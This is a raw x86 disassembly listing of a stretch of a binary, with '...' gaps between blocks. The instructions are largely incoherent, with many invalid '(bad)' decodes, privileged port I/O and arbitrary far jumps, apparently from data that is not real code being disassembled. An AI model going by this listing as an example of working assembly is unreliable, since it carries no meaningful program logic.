  427eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427eb5:	mov    ds:0xf5c7f1c7,al
  427eba:	mov    dh,0xf7
  427ebc:	mov    ebx,esi
  427ebe:	cmp    ebx,edx
  427ec0:	dec    esp
  427ec1:	sti    
  427ec2:	aas    
  427ec3:	int3   
  427ec4:	sahf   
  427ec5:	test   al,0x1
  427ec7:	add    dh,dh
  427ec9:	add    BYTE PTR [eax],al
  427ecb:	add    bh,bh
  427ecd:	xchg   ebx,eax
  427ece:	fwait
  427ecf:	out    0xe5,al
  427ed1:	and    al,0x8
  427ed3:	ret    0xae4c
  427ed6:	xor    BYTE PTR [edi-0xa227e9b],0xa2
  427edd:	cld    
  427ede:	inc    ebx
  427edf:	icebp  
  427ee0:	dec    esp
  427ee1:	and    eax,0x88d1b2c9
  427ee6:	and    BYTE PTR [esi+0x4c9afa5c],0x30
  427eed:	cmp    edi,DWORD PTR [ebx-0x46428126]
  427ef3:	test   DWORD PTR cs:[edx],esi
  427ef6:	in     al,0x23
  427ef8:	fild   WORD PTR [edi]
  427efa:	je     0x427e83
  427efc:	jmp    0x427ed9
  427efe:	inc    edi
  427eff:	xchg   ebx,eax
  427f00:	xchg   ebx,eax
  427f01:	mov    edx,0xd47a440b
  427f06:	xlat   BYTE PTR ds:[ebx]
  427f07:	mov    al,0xb6
  427f09:	imul   edx,DWORD PTR [ecx-0x10],0x502bdebd
  427f10:	or     al,0xcd
  427f12:	or     ecx,DWORD PTR [edi-0x13]
  427f15:	clc    
  427f16:	repz stc 
  427f18:	adc    al,BYTE PTR [eax+0x4d4b5144]
  427f1e:	adc    al,0x94
  427f20:	sbb    al,0x88
  427f22:	or     esi,DWORD PTR [ecx]
  427f24:	jb     0x427f8d
  427f26:	out    dx,al
  427f27:	addr16 sub eax,0x3b98ec57
  427f2d:	fdiv   QWORD PTR [ebx]
  427f2f:	test   al,ch
  427f31:	fadd   DWORD PTR [edx+0x3f]
  427f34:	jecxz  0x427f80
  427f36:	test   BYTE PTR [edx+ebx*4],dl
  427f39:	je     0x427edd
  427f3b:	sub    BYTE PTR [edx-0x51],ah
  427f3e:	jo     0x427f3a
  427f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f41:	hlt    
  427f42:	sbb    DWORD PTR [edi+esi*1+0x15],esp
  427f46:	outs   dx,BYTE PTR ds:[esi]
  427f47:	clc    
  427f48:	and    ebx,0xb13656e7
  427f4e:	fild   QWORD PTR [eax-0x71]
  427f51:	aam    0x6a
  427f53:	fcmovnb st,st(5)
  427f55:	cmp    eax,0xb122a946
  427f5a:	xchg   esi,eax
  427f5b:	in     al,dx
  427f5c:	xlat   BYTE PTR ds:[ebx]
  427f5d:	mov    dh,0x51
  427f5f:	mov    ecx,0xb022458e
  427f64:	outs   dx,BYTE PTR ds:[esi]
  427f65:	lea    esp,[ebx-0x6dbae2b0]
  427f6b:	dec    edx
  427f6c:	and    DWORD PTR [ecx+0x1b84f02d],0x28d51a21
  427f76:	sbb    eax,0xcadc2c40
  427f7b:	aad    0x9d
  427f7d:	and    DWORD PTR [ebx+0x78],ebx
  427f80:	push   edi
  427f81:	push   cs
  427f82:	mov    ebp,0x3994187
  427f87:	pop    ds
  427f88:	aaa    
  427f89:	and    BYTE PTR [bp-0x5217],bl
  427f8e:	push   DWORD PTR [eax+ebp*4]
  427f91:	arpl   WORD PTR [edi+edx*4-0x1319fbe0],sp
  427f98:	test   al,0xf5
  427f9a:	inc    edx
  427f9b:	jb     0x427f20
  427f9d:	call   0x28587ec1
  427fa2:	sbb    al,0xd4
  427fa4:	xor    eax,0xc1daac73
  427fa9:	adc    BYTE PTR [ebp+0x4ac7726f],dl
  427faf:	std    
  427fb0:	cs dec ebx
  427fb2:	inc    edi
  427fb3:	inc    esp
  427fb4:	stos   BYTE PTR es:[edi],al
  427fb5:	sbb    ebp,DWORD PTR ds:0xf4377e68
  427fbb:	mov    ecx,DWORD PTR [edx]
  427fbd:	sbb    ah,BYTE PTR [ecx]
  427fbf:	pop    ecx
  427fc0:	cmp    ebx,ecx
	...
  428032:	add    BYTE PTR [eax],al
  428034:	or     al,0x6d
  428036:	sbb    dl,BYTE PTR [ebp-0x2700885]
  42803c:	mov    DWORD PTR [ebx+0x5a],edx
  42803f:	xchg   DWORD PTR [ecx+0x69],eax
  428042:	adc    ch,BYTE PTR [esp+edx*4-0x57]
  428046:	add    DWORD PTR [eax],eax
  428048:	test   BYTE PTR [eax],0x0
  42804b:	add    BYTE PTR [ebx+0x3831fe00],bl
  428051:	mov    eax,ds:0x34eb500c
  428056:	aam    0x7a
  428058:	in     al,0xe5
  42805a:	and    al,0x0
  42805c:	movaps xmm6,xmm5
  42805f:	test   BYTE PTR [edx],ch
  428061:	popf   
  428062:	ja     0x428055
  428064:	rcl    BYTE PTR [eax-0x77d4a464],cl
  42806a:	jno    0x4280b4
  42806c:	daa    
  42806d:	ret    0x99f3
  428070:	sbb    BYTE PTR [ecx-0x6ece1d97],dl
  428076:	pop    es
  428077:	push   ecx
  428078:	jl     0x428020
  42807a:	in     eax,dx
  42807b:	dec    eax
  42807c:	outs   dx,BYTE PTR ds:[esi]
  42807d:	inc    esp
  42807e:	mov    ds:0x140c63bd,al
  428083:	pop    edx
  428084:	inc    eax
  428085:	sbb    edx,DWORD PTR [edi+0x132f4e38]
  42808b:	sahf   
  42808c:	enter  0xcc93,0xab
  428090:	xchg   esi,eax
  428091:	scas   al,BYTE PTR es:[edi]
  428092:	stos   DWORD PTR es:[edi],eax
  428093:	or     eax,0xa4f56451
  428098:	cmp    DWORD PTR [edi+0x35],edx
  42809b:	repnz and DWORD PTR [edi+0x35],ecx
  42809f:	sar    DWORD PTR [edx+0x51c2419c],0xe6
  4280a6:	ds (bad) 
  4280a8:	push   0x15
  4280aa:	sub    DWORD PTR [ecx+eax*8+0x5d],0xac001c3a
  4280b2:	xor    al,0x9d
  4280b5:	clc    
  4280b6:	fdiv   st,st(3)
  4280b8:	xchg   ecx,eax
  4280b9:	das    
  4280ba:	(bad)  
  4280bb:	out    dx,al
  4280bc:	jbe    0x428118
  4280be:	xor    al,0x54
  4280c0:	rcr    BYTE PTR fs:[eax],cl
  4280c3:	jl     0x42812c
  4280c5:	inc    ebp
  4280c6:	ds jo  0x428099
  4280c9:	gs cs or bl,ah
  4280cd:	pmaxsw mm1,QWORD PTR [edi+ecx*4]
  4280d1:	sahf   
  4280d2:	sbb    edx,esp
  4280d4:	cli    
  4280d5:	add    eax,0xfcf0cd03
  4280da:	jecxz  0x42812a
  4280dc:	aaa    
  4280dd:	pop    edi
  4280de:	mov    esp,0x389bbfee
  4280e3:	xlat   BYTE PTR ds:[ebx]
  4280e4:	xor    eax,0x563882c7
  4280e9:	push   0xfffffffe
  4280eb:	pop    ebp
  4280ec:	xchg   ebp,eax
  4280ed:	cmp    ecx,ebp
  4280ef:	push   esp
  4280f0:	in     eax,dx
  4280f1:	in     eax,dx
  4280f2:	call   0xf1d3:0x3bd989e6
  4280f9:	fs jns 0x42815e
  4280fc:	add    BYTE PTR [ecx],dh
  4280fe:	xchg   ebx,eax
  4280ff:	(bad)  
  428100:	xor    BYTE PTR [bx+0x59],cl
  428104:	scas   eax,DWORD PTR es:[edi]
  428105:	sub    DWORD PTR [edi+0x10757e13],edx
  42810b:	ret    
  42810c:	in     eax,0xcf
  42810e:	pusha  
  42810f:	aad    0x83
  428111:	rcr    dl,1
  428113:	dec    esp
  428114:	sub    ah,BYTE PTR ss:[eax]
  428117:	inc    eax
  428118:	add    edx,DWORD PTR [eax-0x14]
  42811b:	stc    
  42811c:	les    esi,FWORD PTR [ecx+ecx*2]
  42811f:	ror    DWORD PTR [edx-0x7ff90b7a],1
  428125:	icebp  
  428126:	inc    edi
  428127:	dec    ebp
  428128:	fadd   QWORD PTR [eax]
  42812a:	pop    DWORD PTR [esi]
  42812c:	leave  
  42812d:	aaa    
  42812e:	push   0xffffff85
  428130:	test   DWORD PTR [edx+0xb],edi
  428133:	add    cl,BYTE PTR [eax]
  428135:	test   BYTE PTR [ebp-0x7a],bl
  428138:	loopne 0x42810f
  42813a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42813b:	pop    es
  42813c:	loop   0x42817f
  42813e:	jne    0x4280ef
  428140:	(bad)  
  428141:	cmc    
	...
  4281b2:	add    BYTE PTR [eax],al
  4281b4:	push   ds
  4281b5:	inc    ecx
  4281b6:	fdiv   QWORD PTR [edi+ebx*8+0x79eb7ebd]
  4281bd:	stos   BYTE PTR es:[edi],al
  4281be:	push   0x396d4f
  4281c3:	ins    DWORD PTR es:[edi],dx
  4281c4:	mov    ch,BYTE PTR [edx+0xf60001]
  4281ca:	add    BYTE PTR [eax],al
  4281cc:	pusha  
  4281cd:	push   ecx
  4281ce:	inc    esi
  4281cf:	jmp    0x4281cd
  4281d1:	dec    eax
  4281d2:	mov    ecx,0x6055f478
  4281d7:	ins    BYTE PTR es:[edi],dx
  4281d8:	(bad)  
  4281d9:	in     eax,0xb7
  4281db:	inc    esi
  4281dc:	xor    eax,0x4b32b1fa
  4281e1:	jno    0x428213
  4281e3:	pop    ss
  4281e4:	pop    esp
  4281e5:	pop    ss
  4281e6:	fbstp  TBYTE PTR [ecx]
  4281e8:	adc    ebp,esp
  4281ea:	iret   
  4281eb:	out    0x78,al
  4281ed:	stc    
  4281ee:	dec    esp
  4281ef:	es in  al,0x76
  4281f2:	sub    al,BYTE PTR [ebx+0x71019be1]
  4281f8:	rol    BYTE PTR [edx],1
  4281fa:	hlt    
  4281fb:	dec    esp
  4281fc:	dec    ebx
  4281fd:	xchg   DWORD PTR [ebx-0x40da9bce],ebp
  428203:	or     BYTE PTR [ebx-0x3e597f46],bl
  428209:	inc    edx
  42820a:	jns    0x4281c9
  42820c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42820d:	or     al,0xcc
  42820f:	mov    ch,0xec
  428211:	sbb    dh,0xbb
  428214:	gs add al,0x17
  428217:	rol    BYTE PTR [edi-0x5dbf126b],cl
  42821d:	stc    
  42821e:	sub    al,0xed
  428220:	dec    ebx
  428222:	push   cs
  428223:	mov    ch,BYTE PTR [edi+0x7c589093]
  428229:	sub    BYTE PTR [ecx+0x31],ah
  42822c:	push   esi
  42822d:	icebp  
  42822e:	rcr    dh,1
  428230:	dec    ebp
  428232:	loopne 0x428213
  428234:	mov    DWORD PTR [eax-0x26],esi
  428237:	dec    ebp
  428238:	scas   al,BYTE PTR es:[edi]
  428239:	jle    0x4281cc
  42823b:	out    dx,eax
  42823c:	ss add eax,0xc9345b31
  428242:	loop   0x42824c
  428244:	sbb    al,0x7d
  428246:	jg     0x4281dc
  428248:	mov    ecx,0x97802acb
  42824d:	mov    ah,0xec
  42824f:	mov    cl,0xf6
  428251:	out    dx,eax
  428252:	fstp   QWORD PTR [edx-0x47]
  428255:	sbb    ecx,edx
  428257:	in     eax,0xb9
  428259:	stos   DWORD PTR es:[edi],eax
  42825a:	add    BYTE PTR ds:0x4d0594f5,al
  428260:	add    DWORD PTR [eax+0x2],ebp
  428263:	dec    BYTE PTR [ebp+0x39]
  428266:	(bad)  
  428268:	pop    ebx
  428269:	ficom  WORD PTR [ecx]
  42826b:	inc    ebp
  42826c:	sub    al,ah
  42826e:	xor    BYTE PTR [ebp+0x1f],ch
  428271:	pop    ss
  428272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428273:	das    
  428274:	sub    DWORD PTR [ebp+0x60],ebp
  428277:	push   edx
  428278:	and    edi,DWORD PTR [ecx]
  42827a:	mov    dl,0xe4
  42827c:	jl     0x4282ce
  42827e:	xor    ebx,0x7b
  428281:	inc    eax
  428282:	dec    esi
  428283:	fstp   DWORD PTR [ecx+0x2cf96a88]
  428289:	repnz int 0x58
  42828c:	or     DWORD PTR [ebx],ebx
  42828e:	dec    ebx
  42828f:	ror    BYTE PTR [ebp+0x63bd5c9b],1
  428295:	xor    ch,BYTE PTR [ebx+0x37c1343d]
  42829b:	sbb    al,0xf2
  42829d:	into   
  42829e:	(bad)  
  42829f:	ins    DWORD PTR es:[edi],dx
  4282a0:	stc    
  4282a1:	or     BYTE PTR [ebp+0x2bd68ce8],cl
  4282a7:	cmp    eax,DWORD PTR [edi]
  4282a9:	addr16 sbb eax,0xdc950c18
  4282af:	push   esp
  4282b0:	repnz sbb ebp,edx
  4282b3:	xchg   esi,eax
  4282b4:	pop    ebp
  4282b5:	mov    dh,cl
  4282b7:	psllq  mm3,mm0
  4282ba:	int    0xe5
  4282bc:	imul   edi,DWORD PTR [ebp+0x193134c9],0x0
	...
  428333:	add    BYTE PTR [edx],dl
  428335:	sbb    eax,0xaf3f8832
  42833a:	mov    edx,0x671fe09f
  42833f:	pusha  
  428340:	clc    
  428341:	push   es
  428342:	loopne 0x428323
  428344:	sub    BYTE PTR [ebx+0xf60001],0x0
  42834b:	add    bh,ah
  42834d:	js     0x4283be
  42834f:	mov    edi,0x3c320ad8
  428354:	loopne 0x42836f
  428356:	clc    
  428357:	pop    edi
  428358:	aaa    
  428359:	cmp    ebp,0xccf32ec2
  42835f:	iret   
  428360:	mov    esp,0x40ce3f52
  428365:	fstp   TBYTE PTR [eax+0x6a]
  428368:	push   cs
  428369:	ss inc ebx
  42836b:	adc    esi,DWORD PTR [edx+0x76]
  42836e:	xchg   esi,eax
  42836f:	shl    DWORD PTR [ebp-0x43176acd],cl
  428375:	das    
  428376:	jge    0x4283ac
  428378:	ret    0x14c3
  42837b:	out    dx,al
  42837c:	dec    ebx
  42837d:	xor    DWORD PTR [eax],0x7687a4a5
  428383:	rol    DWORD PTR [ebp+eiz*8-0x3f],0x56
  428388:	sbb    edi,eax
  42838a:	ficom  WORD PTR [edi+0x3e]
  42838d:	add    eax,0xe7f17890
  428392:	loop   0x4283c7
  428394:	repnz daa 
  428396:	jno    0x4283a3
  428398:	mov    dh,ch
  42839a:	mov    dl,0xba
  42839c:	or     al,0xaa
  42839e:	imul   eax,DWORD PTR [eax+0x876fea9],0x5e
  4283a5:	dec    ecx
  4283a6:	call   FWORD PTR [eax-0x1c237e51]
  4283ac:	add    DWORD PTR [ebx+0x76],edx
  4283af:	sbb    DWORD PTR [esi+0xfe07c2a],esi
  4283b5:	xlat   BYTE PTR ds:[ebx]
  4283b6:	in     eax,dx
  4283b7:	push   ebx
  4283b8:	test   BYTE PTR [esi],bl
  4283ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283bb:	push   cs
  4283bc:	xor    DWORD PTR [eax-0x21],ebx
  4283bf:	sub    BYTE PTR [ecx-0x38],cl
  4283c2:	adc    ebx,DWORD PTR [eax+eax*8+0x3b]
  4283c6:	sbb    DWORD PTR [ecx],esi
  4283c8:	cli    
  4283c9:	sti    
  4283ca:	dec    ebp
  4283cb:	push   ss
  4283cc:	aad    0xaf
  4283ce:	xchg   esi,eax
  4283cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283d0:	pop    ebp
  4283d1:	pop    ecx
  4283d2:	cwde   
  4283d3:	jecxz  0x428429
  4283d5:	inc    esp
  4283d6:	sub    DWORD PTR [edx+eiz*8+0x3e9968d8],edi
  4283dd:	jecxz  0x42839e
  4283df:	xor    eax,0x24bf0867
  4283e4:	lahf   
  4283e5:	xlat   BYTE PTR ds:[ebx]
  4283e6:	(bad)  
  4283e7:	xchg   esi,eax
  4283e8:	aaa    
  4283e9:	add    BYTE PTR [ecx+0x770044b5],bh
  4283ef:	xchg   edi,eax
  4283f0:	gs mov ebx,0x2b48bc69
  4283f6:	popa   
  4283f7:	and    DWORD PTR [ebx+0x761bc9ca],esp
  4283fd:	xor    bl,BYTE PTR [bp+di+0x835]
  428402:	add    dl,ah
  428404:	shl    esp,cl
  428406:	xchg   edx,eax
  428407:	pop    ebx
  428408:	mov    ds:0x81623ecc,al
  42840d:	les    ecx,FWORD PTR [esi]
  42840f:	push   ebp
  428410:	jmp    DWORD PTR [edx]
  428412:	outs   dx,BYTE PTR ds:[esi]
  428413:	out    0x99,eax
  428415:	mov    ebx,0xae642a7d
  42841a:	xchg   ebp,eax
  42841b:	adc    DWORD PTR [ebx+0x73],ebx
  42841e:	pop    edi
  42841f:	jbe    0x4283a3
  428421:	mov    eax,0xbdddbd00
  428426:	mov    edx,0x172bb54c
  42842b:	iret   
  42842c:	jle    0x4283cc
  42842e:	push   eax
  42842f:	lds    ebx,FWORD PTR [ecx]
  428431:	sbb    cl,BYTE PTR [esi+0x22e0f671]
  428437:	enter  0x6738,0xe
  42843b:	outs   dx,DWORD PTR ds:[esi]
  42843c:	pop    DWORD PTR [eax+0x18]
  42843f:	nop
  428440:	ss adc al,0x0
	...
  4284b3:	add    BYTE PTR [eax+ebp*4-0x40],bl
  4284b7:	stos   DWORD PTR es:[edi],eax
  4284b8:	hlt    
  4284b9:	jmp    0x42853a
  4284bb:	jmp    FWORD PTR [ecx+0x7d6b3407]
  4284c1:	mov    edi,0xac769ab6
  4284c6:	add    DWORD PTR [eax],eax
  4284c8:	test   BYTE PTR [eax],0x0
  4284cb:	add    BYTE PTR [ecx-0x42],cl
  4284ce:	jg     0x42852a
  4284d0:	int    0x62
  4284d2:	sub    esi,ecx
  4284d4:	ret    0xea0b
  4284d7:	popf   
  4284d8:	sbb    BYTE PTR [ebx-0x4ee2e219],ch
  4284de:	sub    ecx,edi
  4284e0:	inc    ebx
  4284e1:	sub    al,0xa
  4284e3:	sub    al,0x52
  4284e5:	adc    edx,DWORD PTR ds:0xb8ca0aa
  4284eb:	push   bp
  4284ed:	jg     0x42856a
  4284ef:	xchg   BYTE PTR [eax-0x4f],dl
  4284f2:	push   cs
  4284f3:	shl    BYTE PTR [ebx],1
  4284f5:	cmp    al,0x6d
  4284f7:	xchg   ebp,eax
  4284f8:	ja     0x428579
  4284fa:	dec    edx
  4284fb:	mov    ds:0xf53afab5,ax
  428501:	and    DWORD PTR [edi+0xfa0afd8],eax
  428507:	jl     0x428582
  428509:	xor    DWORD PTR [ecx],ebp
  42850b:	and    DWORD PTR [ebp+0x3dcf31ae],edi
  428511:	ins    DWORD PTR es:[edi],dx
  428512:	pop    edi
  428513:	stos   DWORD PTR es:[edi],eax
  428514:	inc    eax
  428515:	lds    esi,FWORD PTR [esi+edi*8+0x6c]
  428519:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42851a:	jmp    0x48db:0x1fc5de23
  428521:	jb     0x428547
  428523:	fst    st(1)
  428525:	cs and al,0x3b
  428528:	xchg   ecx,eax
  428529:	sahf   
  42852a:	xor    BYTE PTR [ecx-0x3c],ah
  42852d:	frstor [edx]
  42852f:	pusha  
  428530:	mov    ch,0xbe
  428532:	jbe    0x42850e
  428534:	repnz stos BYTE PTR es:[edi],al
  428536:	xchg   esi,eax
  428537:	push   0xffffffbd
  428539:	jge    0x42853b
  42853b:	or     eax,0x56ee682b
  428540:	inc    ebx
  428541:	mov    ah,0xbc
  428543:	mov    esp,0xaf1d8190
  428548:	daa    
  428549:	imul   ecx,DWORD PTR [esi+esi*1-0x71f0c25a],0x4196b87a
  428554:	lods   al,BYTE PTR ds:[esi]
  428555:	cs retf 
  428557:	cmp    bl,dh
  428559:	test   DWORD PTR [ebp+edi*2-0x189cd1b],ecx
  428560:	pop    ds
  428561:	mov    al,ds:0x91a2e2fb
  428566:	mov    bh,0x77
  428568:	jl     0x42852a
  42856a:	fimul  DWORD PTR [edx+esi*2+0x541ec594]
  428571:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428572:	or     BYTE PTR [edi],ah
  428574:	rol    DWORD PTR [ecx-0x5c],0x29
  428578:	iret   
  428579:	mov    al,0x28
  42857b:	sbb    ah,BYTE PTR [edx-0x743dca4b]
  428581:	imul   DWORD PTR [ebx-0x2091775c]
  428587:	pushf  
  428588:	jae    0x428601
  42858a:	imul   esi,DWORD PTR [edx],0xffffffd2
  42858d:	mov    DWORD PTR [esi+0x7e73a44c],ebx
  428593:	xchg   bp,ax
  428595:	dec    esi
  428596:	mov    ebp,0x95cf2740
  42859b:	ret    0x954c
  42859e:	ss ret 0xf65e
  4285a2:	and    BYTE PTR [esi],0xcb
  4285a5:	rcr    DWORD PTR [ebx],cl
  4285a7:	xchg   ebp,eax
  4285a8:	gs mov ecx,0xd0338c5e
  4285ae:	and    eax,0x4cd55477
  4285b3:	(bad)  
  4285b4:	fcmove st,st(7)
  4285b6:	push   cs
  4285b7:	arpl   WORD PTR [edi],dx
  4285b9:	pop    edx
  4285ba:	pop    ss
  4285bb:	clc    
  4285bc:	mov    ah,0xa3
  4285be:	sub    al,0x57
  4285c0:	or     BYTE PTR [edi+0x0],dl
	...
  428632:	add    BYTE PTR [eax],al
  428634:	add    DWORD PTR [esi-0x70],edx
  428637:	out    dx,al
  428638:	xlat   BYTE PTR ds:[ebx]
  428639:	out    dx,al
  42863a:	jg     0x42863b
  42863c:	(bad)  
  42863d:	dec    esi
  42863e:	cmp    al,0xb7
  428640:	sti    
  428641:	push   esp
  428642:	push   0x1ad6c53
  428647:	add    dh,dh
  428649:	add    BYTE PTR [eax],al
  42864b:	add    BYTE PTR [ecx],bh
  42864d:	sbb    ah,al
  42864f:	inc    ebx
  428650:	sbb    eax,0x8e89d912
  428655:	dec    ebx
  428656:	jmp    0x4a94:0xd00ae259
  42865d:	add    al,0x72
  42865f:	add    al,0xe2
  428661:	mov    dh,0xb3
  428663:	sbb    BYTE PTR [ebx+esi*2-0x3f],0x4b
  428668:	fistp  QWORD PTR [edi]
  42866a:	xchg   DWORD PTR ds:0xf99ea751,ecx
  428670:	icebp  
  428671:	or     BYTE PTR [edi],0xe3
  428674:	xor    eax,0x783bd51b
  428679:	or     al,0x6b
  42867b:	fidiv  DWORD PTR [esi-0x74]
  42867e:	xchg   edx,eax
  42867f:	adc    ah,ah
  428681:	sub    eax,0xb93002ce
  428686:	lea    eax,[ecx+edi*4+0x73a2774]
  42868d:	sub    ch,bh
  42868f:	lock aas 
  428691:	mov    ah,0x10
  428693:	ss jno 0x4286b4
  428696:	or     al,0xc9
  428698:	out    0x54,eax
  42869a:	xchg   dl,al
  42869c:	test   eax,0xf53fbb6f
  4286a1:	mov    DWORD PTR [edx+0x5b41b8e4],ebp
  4286a7:	adc    BYTE PTR [ecx+0x1c849636],cl
  4286ad:	or     DWORD PTR [esi+0x7f],0xffffff9a
  4286b1:	push   0x1a
  4286b3:	xchg   esi,eax
  4286b4:	cdq    
  4286b5:	add    eax,0x6481c7cc
  4286ba:	jnp    0x428733
  4286bc:	mov    ch,0xc2
  4286be:	mov    ebx,0xe7a9d645
  4286c3:	pushw  ds
  4286c5:	outs   dx,BYTE PTR ds:[esi]
  4286c6:	fadd   DWORD PTR [ebx+0x61b227ce]
  4286cc:	mov    al,0x16
  4286ce:	sub    dl,ch
  4286d0:	outs   dx,BYTE PTR ds:[esi]
  4286d1:	ret    0x2dec
  4286d4:	or     DWORD PTR [ecx+0x6a],edx
  4286d7:	jle    0x428664
  4286d9:	push   eax
  4286da:	(bad)  
  4286db:	xor    ebx,DWORD PTR [eax+0x1bef8115]
  4286e1:	mul    ebx
  4286e3:	repz mov ebp,0xaba2be55
  4286e9:	popf   
  4286ea:	repz lds ecx,FWORD PTR [edx-0x43]
  4286ee:	fbstp  TBYTE PTR [ecx]
  4286f0:	and    BYTE PTR [esi+0x554db160],al
  4286f6:	sar    BYTE PTR [ebp+0x7eca7ed9],1
  4286fc:	xchg   ebp,eax
  4286fd:	mov    esi,0x18d75ec3
  428702:	push   esp
  428703:	push   esp
  428704:	lea    esp,[eax+eax*1]
  428707:	cwde   
  428708:	xor    DWORD PTR [esi-0x6a],0x31
  42870c:	(bad)  
  42870d:	std    
  42870e:	or     ah,BYTE PTR [eax-0x35]
  428711:	ins    DWORD PTR es:[edi],dx
  428712:	repz jbe 0x42877f
  428715:	inc    esp
  428716:	xlat   BYTE PTR ds:[ebx]
  428717:	call   0xe4d:0x4f6bfb18
  42871e:	es cs cwde 
  428721:	repnz retf 0xf977
  428725:	ja     0x428768
  428727:	out    0xdd,eax
  428729:	lods   eax,DWORD PTR ds:[esi]
  42872a:	and    ch,0xc7
  42872d:	aam    0x3f
  42872f:	sub    al,0x86
  428731:	add    dl,bh
  428733:	sar    edx,cl
  428735:	stos   DWORD PTR es:[edi],eax
  428736:	cld    
  428737:	lods   al,BYTE PTR ds:[esi]
  428738:	adc    DWORD PTR [ebp-0x60],eax
  42873b:	outs   dx,DWORD PTR ds:[esi]
  42873c:	in     al,dx
  42873d:	je     0x428789
  42873f:	mov    ch,0xc7
  428741:	je     0x428743
	...
  4287b3:	add    BYTE PTR [edx],bl
  4287b5:	mov    cl,BYTE PTR [ebx]
  4287b7:	inc    ebp
  4287b8:	fwait
  4287b9:	lds    ebx,FWORD PTR [esi-0x21]
  4287bc:	xor    edi,DWORD PTR [edx-0x4e96d662]
  4287c2:	inc    edi
  4287c3:	dec    edi
  4287c4:	bound  ebp,QWORD PTR [esi+0xf60001]
  4287ca:	add    BYTE PTR [eax],al
  4287cc:	int3   
  4287cd:	adc    ah,0x31
  4287d0:	retf   0x3891
  4287d3:	sbb    BYTE PTR [edx+0xd4587df],bh
  4287d9:	jns    0x428852
  4287db:	push   esi
  4287dc:	add    BYTE PTR [edx+0x2776b333],0x87
  4287e3:	mov    WORD PTR [ebx-0x7a],fs
  4287e6:	pop    es
  4287e7:	xchg   ecx,eax
  4287e8:	mov    DWORD PTR [ecx-0x74],0xda8dea97
  4287ef:	or     eax,0x44d6ad79
  4287f4:	xor    dh,BYTE PTR [ebx]
  4287f6:	sub    al,0x61
  4287f8:	loope  0x428783
  4287fa:	ss ss mov edx,0xc5e3d50b
  428801:	stc    
  428802:	fadd   DWORD PTR [esi+0x488611d2]
  428808:	and    al,0x36
  42880a:	fcom   DWORD PTR cs:[edi+0x3d]
  42880e:	dec    ecx
  42880f:	hlt    
  428810:	loop   0x428814
  428812:	gs pop ss
  428814:	xor    al,0x29
  428816:	jle    0x4287df
  428818:	dec    ecx
  428819:	rcr    DWORD PTR [ebp+0x14644778],1
  42881f:	test   DWORD PTR [edi],0xb7667d98
  428825:	out    dx,al
  428826:	jae    0x4287d2
  428828:	sahf   
  428829:	ret    0x6d93
  42882c:	(bad)
  428830:	loopne 0x42883d
  428832:	xchg   esp,eax
  428833:	fs add bh,ch
  428836:	mov    bh,0xf8
  428838:	(bad)  
  428839:	jge    0x42887e
  42883b:	jmp    DWORD PTR [esi]
  42883d:	cmp    edx,DWORD PTR ds:0x45e817
  428843:	and    BYTE PTR [edi+0x29],bh
  428846:	sub    DWORD PTR [edx],esp
  428848:	adc    dh,BYTE PTR [eax]
  42884a:	and    BYTE PTR [edi],cl
  42884c:	dec    edi
  42884d:	mov    ebx,0x510f81a2
  428852:	pop    esp
  428853:	cmp    DWORD PTR [ecx],esi
  428855:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  428857:	mov    edi,0xeebb216c
  42885c:	(bad)  
  42885e:	repz jge 0x4287ee
  428861:	inc    esi
  428862:	dec    edx
  428863:	popa   
  428864:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428865:	push   edx
  428866:	stc    
  428867:	sub    BYTE PTR [edx+0x19],bh
  42886a:	jp     0x4288df
  42886c:	ror    BYTE PTR ds:0x55c1fbb2,1
  428872:	bound  esi,QWORD PTR [edx-0xe]
  428875:	add    esp,DWORD PTR [ebx-0x57]
  428878:	bound  ebp,QWORD PTR [eax-0x11]
  42887b:	(bad)  
  42887c:	xor    edi,DWORD PTR [edi+0x48]
  42887f:	repz xchg esi,eax
  428881:	outs   dx,DWORD PTR ds:[esi]
  428882:	or     eax,0x53f2947c
  428887:	popf   
  428888:	mov    ch,0x96
  42888a:	pop    ecx
  42888b:	add    esp,ecx
  42888d:	lock mov eax,DWORD PTR [eax+0x4e]
  428891:	rcr    BYTE PTR [esi],cl
  428893:	jecxz  0x428906
  428895:	add    eax,0xf20fe08a
  42889a:	push   0x42
  42889c:	lea    ebp,[ebp+0x662de361]
  4288a2:	mov    ss,WORD PTR [edi+ebx*4]
  4288a5:	pushw  ds
  4288a7:	div    BYTE PTR [edx-0x318f4cc3]
  4288ad:	push   edx
  4288ae:	pop    edx
  4288af:	lods   al,BYTE PTR ds:[esi]
  4288b0:	inc    edi
  4288b1:	shl    DWORD PTR [edi+0x27],cl
  4288b4:	mov    edx,0xd0a72eba
  4288b9:	sub    BYTE PTR [ecx-0x43fbebc3],bh
  4288bf:	dec    edi
  4288c0:	out    dx,al
  4288c1:	mov    eax,0x0
	...
  428932:	add    BYTE PTR [eax],al
  428934:	call   0xdea3:0xffa3ffdd
  42893b:	std    
  42893c:	clc    
  42893d:	jns    0x4289b6
  42893f:	jmp    0xaf58:0xb1ac513b
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    BYTE PTR [edi+edx*1+0x19],cl
  42894f:	fwait
  428950:	cmc    
  428951:	mov    ecx,0xf4088cbd
  428956:	lds    edi,FWORD PTR [edi+0x2f]
  428959:	lahf   
  42895a:	or     dl,BYTE PTR [eax]
  42895c:	lods   al,BYTE PTR ds:[esi]
  42895d:	xchg   bl,bl
  42895f:	jo     0x428938
  428961:	or     al,0x5f
  428963:	jbe    0x42894d
  428965:	mov    cl,0x3b
  428967:	cmp    DWORD PTR [edi-0x7329f9c],0xa98666c5
  428971:	daa    
  428972:	push   ebp
  428973:	je     0x4289d9
  428975:	imul   esi,DWORD PTR [edx-0x5364d4c8],0x79467fe8
  42897f:	add    al,0xee
  428981:	(bad)  
  428983:	cmc    
  428984:	loopne 0x4289e7
  428986:	cmc    
  428987:	loop   0x4289d6
  428989:	and    cl,al
